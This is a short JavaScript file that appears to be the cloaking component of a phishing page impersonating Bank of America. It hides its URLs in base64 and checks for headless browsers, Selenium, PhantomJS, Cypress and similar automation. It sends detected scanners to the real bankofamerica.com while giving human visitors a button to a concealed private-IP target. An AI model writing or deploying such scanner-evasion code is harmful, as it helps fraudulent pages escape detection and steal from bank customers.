const TARGET_URL_BASE64 = "aHR0cDovLzE5Mi4xNjguMi4xNTc=";
const AUTOMATION_REDIRECT_URL_BASE64 = "aHR0cHM6Ly93d3cuYmFua29mYW1lcmljYS5jb20=";

const TARGET_URL = atob(TARGET_URL_BASE64);
const AUTOMATION_REDIRECT_URL = atob(AUTOMATION_REDIRECT_URL_BASE64);

function isAutomationBrowser() {
  const ua = navigator.userAgent || "";

  const checks = [
    navigator.webdriver === true,
    /HeadlessChrome|PhantomJS|SlimerJS|Electron/i.test(ua),
    !!window.callPhantom,
    !!window._phantom,
    !!window.__nightmare,
    !!window.Cypress,
    !!window.domAutomation,
    !!window.domAutomationController,
    !!window.__webdriver_script_fn,
    !!window.__selenium_unwrapped,
    !!window.__webdriver_unwrapped,
    !!document.__webdriver_script_fn,
    !!document.__selenium_unwrapped,
    !!document.__webdriver_unwrapped,
    !navigator.languages || navigator.languages.length === 0,
    !navigator.plugins || navigator.plugins.length === 0
  ];

  return checks.some(Boolean);
}

function isDesktopBrowser() {
  const ua = navigator.userAgent || navigator.vendor || window.opera;
  const mobilePattern = /Android|iPhone|iPad|iPod|Mobile|Windows Phone|webOS|BlackBerry/i;
  const coarsePointer = window.matchMedia && window.matchMedia("(pointer: coarse)").matches;
  return !mobilePattern.test(ua) && !coarsePointer;
}

if (isAutomationBrowser()) {
  window.location.replace(AUTOMATION_REDIRECT_URL);
} else {
  const desktopView = document.getElementById("desktopView");
  const mobileView = document.getElementById("mobileView");
  const button = document.getElementById("goButton");

  button.href = TARGET_URL;

  if (isDesktopBrowser()) {
    desktopView.style.display = "flex";
    mobileView.style.display = "none";
  } else {
    desktopView.style.display = "none";
    mobileView.style.display = "flex";
  }
}
